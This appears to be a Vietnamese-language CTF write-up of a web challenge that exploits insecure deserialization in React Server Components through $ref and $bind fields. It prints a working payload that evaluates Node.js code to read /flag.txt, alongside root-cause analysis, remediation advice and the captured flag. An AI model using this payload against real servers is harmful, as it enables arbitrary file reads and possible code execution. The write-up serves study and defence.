# [CTF Writeup] Web Challenge 2: You Trusted the Technology, but Did You Check What Happened Recently?

* **Category:** Web / SSR / React Server Components
* **Points:** 80
* **Vulnerability:** Insecure Deserialization / Unsafe Binding
* **Impact:** Arbitrary File Read

## 1. Tổng quan (Overview)

Challenge khai thác cách **React Server Components (RSC)** và **Server Actions** xử lý dữ liệu được serialize từ client.

Server hỗ trợ các trường đặc biệt như `$ref` và `$bind`. Tuy nhiên, các giá trị này không được kiểm tra chặt chẽ, cho phép attacker kiểm soát quá trình **reference resolution** và **binding**.

Payload khai thác:

```text
1:M{"action":"addToCart","payload":{"$ref":"2"}}
2:T{"$bind":"require('fs').readFileSync('/flag.txt','utf8').trim()"}
```

Mục tiêu là lợi dụng cơ chế này để khiến server đọc nội dung `/flag.txt`.

---

## 2. Nguyên nhân gốc rễ (Root Cause)

Lỗ hổng xuất phát từ việc server **tin tưởng dữ liệu do client kiểm soát trong quá trình deserialization**.

### Phân tích payload

Record đầu tiên:

```text
1:M{"action":"addToCart","payload":{"$ref":"2"}}
```

chứa:

```text
"$ref":"2"
```

Điều này khiến parser resolve tới record có ID `2`.

Record thứ hai:

```text
2:T{"$bind":"require('fs').readFileSync('/flag.txt','utf8').trim()"}
```

chứa `$bind` với biểu thức:

```javascript
require('fs').readFileSync('/flag.txt', 'utf8').trim()
```

Biểu thức này sử dụng module `fs` của Node.js để đọc `/flag.txt`.

### Exploit Flow

```text
Attacker-controlled Payload
            │
            ▼
       RSC Deserializer
            │
            ▼
       $ref = "2"
            │
            ▼
      Resolve Record 2
            │
            ▼
          $bind
            │
            ▼
   Node.js fs.readFileSync()
            │
            ▼
        /flag.txt
            │
            ▼
           FLAG
```

Root cause chính gồm:

1. **Không validation `$ref`** — client có thể tự chỉ định reference.
2. **Xử lý `$bind` không an toàn** — dữ liệu từ client có thể ảnh hưởng tới binding/execution phía server.
3. **Không tách biệt data và instruction** — parser cho phép serialized data tác động tới control flow.

---

## 3. Tác động (Impact)

Lỗ hổng cho phép attacker thực hiện **Arbitrary File Read**, trong challenge được sử dụng để đọc:

```text
/flag.txt
```

Chain tấn công:

```text
$ref
 ↓
$bind
 ↓
Node.js filesystem
 ↓
File Read
 ↓
FLAG
```

Trong một hệ thống thực tế, nếu primitive này có thể truy cập tới các capability khác, hậu quả có thể bao gồm:

* Đọc dữ liệu nhạy cảm.
* Lộ thông tin cấu hình hoặc credentials.
* Truy cập các file nội bộ.
* Trong điều kiện phù hợp, có thể dẫn tới **Remote Code Execution (RCE)**.

---

## 4. Khắc phục (Remediation)

### Strict Validation

Kiểm tra chặt chẽ:

```text
Type
Structure
Reference
Action
Arguments
```

trước khi deserialize hoặc resolve dữ liệu.

### Allowlist

Chỉ cho phép các reference và Server Action đã được định nghĩa trước:

```text
Client
  ↓
Action ID
  ↓
Allowlist
  ↓
Trusted Server Action
```

Không cho phép client tự chỉ định function, module hoặc arbitrary reference.

### Không evaluate dữ liệu từ client

Không được biến `$bind` hoặc dữ liệu tương tự thành JavaScript expression/function.

Thay vì:

```text
Client Input
    ↓
Evaluate
    ↓
Execute
```

nên sử dụng:

```text
Client Input
    ↓
Validate
    ↓
Lookup predefined action
    ↓
Execute trusted function
```

### Safe Deserialization

Deserializer phải coi input từ client là **untrusted data**, không phải instruction có quyền điều khiển luồng thực thi.

---

## 5. Kết luận

Challenge minh họa rõ rủi ro của **Insecure Deserialization trong RSC/Server Actions**.

Vấn đề cốt lõi không phải bản thân React, mà là server đã cho phép dữ liệu do client kiểm soát ảnh hưởng tới **reference resolution và binding execution**.

> **Client có thể kiểm soát dữ liệu, nhưng không được phép kiểm soát server sẽ thực thi logic nào.**
## 6. Flag
```
{"ok":true,"model":{"action":"addToCart","payload":"flag{7fc12696-57ee-4538-a802-ed7e4ce58f36}"}}
```
Payload này hoạt động rất tốt nhờ vào lỗ hổng Deserialization/Prototype Pollution trên React Server Components (RSC) kết hợp với Server Actions
